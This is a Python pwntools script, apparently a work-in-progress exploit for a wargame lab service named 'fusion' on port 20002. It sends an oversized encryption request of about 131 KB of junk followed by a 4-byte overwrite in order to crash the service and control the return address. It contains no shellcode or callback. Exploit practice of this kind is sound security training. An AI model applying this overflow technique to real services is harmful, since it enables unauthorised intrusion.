import pwn
import sys

RHOST = 'fusion'
RPORT = 20002 
BUFFER_SIZE = 32 * 4096

def main():
    io = pwn.remote(RHOST, RPORT)
    print(io.recvline().decode())
    cause_segfault(io)
    send_nonexistent_command(io)
    # send_end_byte(io)
    # normal_use(io)
    
def send_end_byte(io):
    io.send(b'Q')

def send_nonexistent_command(io):
    io.send(b'K')

def cause_segfault(io):
    io.send(b'E')

    junk = b'A' * 131088
    override = b'B' * 4

    payload = b''
    payload += junk
    payload += override

    payload_length = len(payload)

    print('Sent data size: {}'.format(payload_length))

    io.send(pwn.p32(len(payload)))
    io.send(payload)

    print(io.recvline().decode())
    received_length = pwn.u32(io.recv(4))
    received_data = io.recv(received_length)
    print('Received size response: {}'.format(received_length))
    # print('Received ciphered data: {}'.format(received_data))
    print('Received data size is: {}'.format(len(received_data)))


def normal_use(io):
    io.send(b'E')
    data = b'Lorem ipsum dolor sit amet, consectetur adipiscing elit.'
    length = len(data)
    length_bytes = pwn.p32(length)

    io.send(length_bytes)
    io.send(data)

    print(io.recvline().decode())
    print('Received size response: {}'.format(pwn.u32(io.recv(4))))
    # print('Received ciphered data: {}'.format(io.recv(length)))
    print('Received ciphered data with length: {}'.format(len(io.recv(length))))


if __name__ == "__main__":
    main()
